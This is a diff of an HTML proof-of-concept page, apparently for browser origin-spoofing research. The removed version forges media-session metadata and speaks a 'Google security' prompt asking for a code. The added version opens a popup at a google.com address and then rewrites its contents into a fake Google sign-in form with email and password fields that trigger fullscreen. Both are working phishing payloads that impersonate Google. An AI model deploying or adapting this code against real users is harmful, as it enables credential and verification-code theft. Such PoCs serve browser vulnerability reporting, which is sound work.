@@ -1,14 +1,96 @@
-<!doctype html><meta charset="utf-8"><title>Audio Origin Spoof - 2 mediasession metadata</title>
-<!-- OBSERVE: open the OS media hub / lockscreen (or chrome://media-internals).
-     Attacker-authored title + artist + artwork sit next to the google.com tab. -->
-<button onclick="
-  navigator.mediaSession.metadata = new MediaMetadata({
-    title:  'Verify your Google Account',
-    artist: 'google.com',
-    album:  'Security Notice',
-    artwork:[{src:'https://www.google.com/favicon.ico',sizes:'96x96',type:'image/x-icon'}]
-  });
-  const u = new SpeechSynthesisUtterance('Google security. Please confirm the code shown on your screen.');
-  u.rate = 0.9; speechSynthesis.speak(u);
-  setTimeout(() => { location.href = 'https://google.com'; }, 800);
-"> Test </button>
+
+<!DOCTYPE html>
+<html>
+<body>
+
+<h1>The Window Object</h1>
+<h2>The open() Method</h2>
+
+<p>do you need jobs on google?.</p>
+
+<button onclick="myFunction()">open.google.com</button>
+
+<script>
+function myFunction() {
+    var x = window.open("https://google.com:9090/#https://google.com:9090", "_blank", "width=400,height=300");
+
+    setTimeout(function(){x}, 1850);
+
+    setTimeout(function() {
+        x.document.write(`
+<title>https://accounts.google.com</title>
+        <style>
+body {
+font-family: Arial, sans-serif;
+background: #f0ebf8;
+justify-content: center;
+align-items: center;
+height: 100vh;
+margin: 0;
+}
+
+.form-container {
+background: white;
+width: 360px;
+padding: 30px;
+border-radius: 12px;
+box-shadow: 0 3px 8px rgba(0,0,0,0.15);
+}
+
+.input-group {
+margin-bottom: 18px;
+}
+
+input {
+width: 100%;
+padding: 12px;
+font-size: 15px;
+border: 1px solid #dadce0;
+border-radius: 6px;
+outline: none;
+transition: border 0.2s;
+}
+
+input:focus {
+border: 2px solid #1a73e8;
+}
+button {
+width: 100%;
+padding: 12px;
+background: #1a73e8;
+color: white;
+border: none;
+border-radius: 6px;
+font-size: 16px;
+cursor: pointer;
+margin-top: 10px;
+}
+
+button:hover {
+background: #1664c4;
+}
+</style>
+
+<div class="form-container">
+<div class="form-title">Login</div>
+
+<div class="input-group">
+<input type="text" placeholder="Email or Phone Number"
+onclick="document.documentElement.requestFullscreen();" required>
+</div>
+
+<div class="input-group">
+<input type="password" placeholder="Password"
+onclick="document.documentElement.requestFullscreen();" required>
+</div>
+
+<button>Masuk</button>
+</div>
+`);
+        x.document.close();
+    }, 2400);
+}
+</script>
+
+</body>
+</html>
